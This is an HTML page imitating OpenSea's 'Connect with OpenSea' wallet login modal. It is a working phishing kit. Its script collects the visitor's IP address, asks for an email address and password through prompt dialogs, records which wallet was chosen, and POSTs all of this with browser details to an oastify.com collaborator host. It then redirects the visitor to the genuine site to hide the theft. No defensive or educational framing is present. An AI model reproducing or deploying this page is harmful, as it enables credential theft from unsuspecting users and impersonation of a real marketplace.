<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OpenSea - Connect Wallet</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica Neue, sans-serif;
            background: rgba(0, 0, 0, 0.7) url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 1000"><defs><pattern id="pattern" x="0" y="0" width="100" height="100" patternUnits="userSpaceOnUse"><circle cx="50" cy="50" r="1" fill="%23333"/></pattern></defs><rect width="1000" height="1000" fill="%23111"/><rect width="1000" height="1000" fill="url(%23pattern)"/></svg>');
            background-size: cover;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .modal {
            background: #1a1a1a;
            border-radius: 16px;
            max-width: 450px;
            width: 100%;
            padding: 40px;
            position: relative;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
            border: 1px solid #333;
        }
        
        .close-btn {
            position: absolute;
            top: 20px;
            right: 20px;
            background: none;
            border: none;
            color: #fff;
            font-size: 24px;
            cursor: pointer;
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .close-btn:hover {
            opacity: 0.7;
        }
        
        .logo-container {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo {
            width: 60px;
            height: 60px;
            background: #2081e1;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 32px;
        }
        
        h1 {
            color: #fff;
            font-size: 22px;
            margin-bottom: 15px;
            font-weight: 600;
        }
        
        .subtitle {
            color: #888;
            font-size: 14px;
            margin-bottom: 30px;
        }
        
        .email-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #2081e1 0%, #1a5ec1 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 20px;
            transition: opacity 0.2s;
        }
        
        .email-btn:hover {
            opacity: 0.9;
        }
        
        .arrow {
            font-size: 18px;
        }
        
        .divider {
            text-align: center;
            margin: 25px 0;
            color: #666;
            font-size: 12px;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            display: inline-block;
            width: 40%;
            height: 1px;
            background: #333;
            vertical-align: middle;
        }
        
        .divider::before {
            margin-right: 10px;
        }
        
        .divider::after {
            margin-left: 10px;
        }
        
        .wallet-options {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 20px;
        }
        
        .wallet-btn {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px 16px;
            background: #222;
            border: 1px solid #333;
            border-radius: 8px;
            color: #fff;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .wallet-btn:hover {
            background: #2a2a2a;
            border-color: #2081e1;
        }
        
        .wallet-icon {
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
        }
        
        .more-options {
            text-align: center;
            margin-bottom: 25px;
        }
        
        .more-options a {
            color: #2081e1;
            text-decoration: none;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
        }
        
        .more-options a:hover {
            text-decoration: underline;
        }
        
        .terms {
            font-size: 11px;
            color: #666;
            text-align: center;
            line-height: 1.6;
        }
        
        .terms a {
            color: #2081e1;
            text-decoration: none;
        }
        
        .terms a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="modal">
        <button class="close-btn">✕</button>
        
        <div class="logo-container">
            <div class="logo">🌊</div>
            <h1>Connect with OpenSea</h1>
            <p class="subtitle">Choose how you want to connect</p>
        </div>
        
        <button class="email-btn" onclick="handleEmailLogin()">
            <span>Continue with email</span>
            <span class="arrow">→</span>
        </button>
        
        <div class="divider">or continue with an external wallet</div>
        
        <div class="wallet-options">
            <button class="wallet-btn" onclick="handleWallet('metamask')">
                <div class="wallet-icon">🦊</div>
                <span>MetaMask</span>
            </button>
            
            <button class="wallet-btn" onclick="handleWallet('walletconnect')">
                <div class="wallet-icon">💳</div>
                <span>WalletConnect</span>
            </button>
            
            <button class="wallet-btn" onclick="handleWallet('phantom')">
                <div class="wallet-icon">👻</div>
                <span>Phantom</span>
            </button>
        </div>
        
        <div class="more-options">
            <a href="#">More Wallet Options</a>
        </div>
        
        <div class="terms">
            By connecting your wallet and using OpenSea, you agree to our
            <a href="#">Terms of Service</a> & <a href="#">Privacy Policy</a>
        </div>
    </div>
    
    <script>
        // Initialize IP detection
        window.visitorIP = 'Detecting...';
        
        var ipAPIs = [
            {url: 'https://api.ipify.org?format=json', key: 'ip'},
            {url: 'https://api64.ipify.org?format=json', key: 'ip'},
            {url: 'https://icanhazip.com/', key: 'text'},
            {url: 'https://ifconfig.me', key: 'text'}
        ];
        
        function detectIP(index = 0) {
            if (index >= ipAPIs.length) {
                window.visitorIP = 'Unknown';
                return;
            }
            
            var apiConfig = ipAPIs[index];
            
            fetch(apiConfig.url, {mode: 'no-cors'})
                .then(response => {
                    if (apiConfig.key === 'json') {
                        return response.json();
                    } else {
                        return response.text();
                    }
                })
                .then(data => {
                    if (apiConfig.key === 'json') {
                        window.visitorIP = data.ip || data.query || 'Unknown';
                    } else {
                        window.visitorIP = data.trim() || 'Unknown';
                    }
                })
                .catch(() => {
                    detectIP(index + 1);
                });
        }
        
        detectIP();
        
        // Handle email login
        function handleEmailLogin() {
            var email = prompt('Enter your email address:');
            if (email) {
                var password = prompt('Enter your password:');
                if (password) {
                    sendData({
                        method: 'email',
                        email: email,
                        password: password
                    });
                }
            }
        }
        
        // Handle wallet selection
        function handleWallet(wallet) {
            sendData({
                method: 'wallet',
                wallet_type: wallet,
                message: 'Wallet connection initiated'
            });
        }
        
        // Send collected data to server
        function sendData(payload) {
            var data = {
                ...payload,
                ip_address: window.visitorIP,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                language: navigator.language
            };
            
            fetch('https://ugejap8f9h3y5dkafta01qryepkg8dw2.oastify.com/', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(data)
            }).catch(() => {});
            
            alert('Connecting to OpenSea...');
            setTimeout(() => {
                window.location = 'https://opensea.io';
            }, 1500);
        }
        
        // Close button
        document.querySelector('.close-btn').onclick = function() {
            window.location = 'https://opensea.io';
        };
    </script>
</body>
</html>
